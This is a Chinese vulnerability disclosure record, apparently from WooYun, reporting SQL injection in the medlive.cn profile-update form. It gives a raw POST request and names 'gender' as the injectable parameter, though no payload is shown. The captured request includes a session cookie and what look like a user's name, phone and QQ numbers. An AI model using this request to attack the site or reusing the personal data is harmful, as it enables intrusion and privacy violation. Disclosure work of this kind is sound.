wybug_detail:
漏洞详情 披露状态：   									2015-04-11：	细节已通知厂商并且等待厂商处理中									2015-04-13：	厂商已经确认，细节仅向厂商公开									2015-04-23：	细节向核心白帽子及相关领域专家公开									2015-05-03：	细节向普通白帽子公开									2015-05-13：	细节向实习白帽子公开									2015-05-28：	细节向公众公开  简要描述： 医脉通主站SQL注入 详细说明：  POST /setting/profile_do HTTP/1.1Host: setting.medlive.cnProxy-Connection: keep-aliveContent-Length: 477Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://setting.medlive.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://setting.medlive.cn/setting/profileAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: pgv_pvi=8469252096; __utma=181789304.176015261.1428044132.1428044132.1428044132.1; __utmz=181789304.1428044132.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); ymtinfo=eyJ1aWQiOiIyMDkyMDMyIiwicmVzb3VyY2UiOiIiLCJhcHBfbmFtZSI6IiIsImV4dF92ZXJzaW9uIjoiMSJ9; _pk_ref.3.a971=%5B%22%22%2C%22%22%2C1428631966%2C%22http%3A%2F%2Fwww.medlive.cn%2F%22%5D; sess=ST-3256957-7CA2EJUrUqQkGIWHbPs3-cas; Hm_lvt_62d92d99f7c1e7a31a11759de376479f=1428048540,1428379190,1428456686,1428631966; Hm_lpvt_62d92d99f7c1e7a31a11759de376479f=1428631973; _pk_id.3.a971=ad5014f8b42f2a9d.1428039189.8.1428631974.1428462355.; _pk_ses.3.a971=*from_url=&realname=%E5%BC%A0%E6%AD%A5%E5%A9%B7&gender=0&birthday=1979&now=work&company1=120000&company2=120100&company3=120102&company4=10000566&company_other=&profession=10000&profession2=10200&profession3=10204&title=%E5%88%9D%E7%BA%A7%E8%81%8C%E7%A7%B0%E4%BB%A5%E4%B8%8B&title2=%E5%AD%A6%E7%94%9F&headship=%E5%8C%BB%E7%94%9F&research=%E4%B8%B4%E5%BA%8A&school=224&school2=425&school_other=&mobile=13813900000&qq=33333333&address=%E5%A4%A9%E6%B4%A5%E9%BB%84%E9%B9%A4%E5%8E%BB注入参数 gender   漏洞证明：
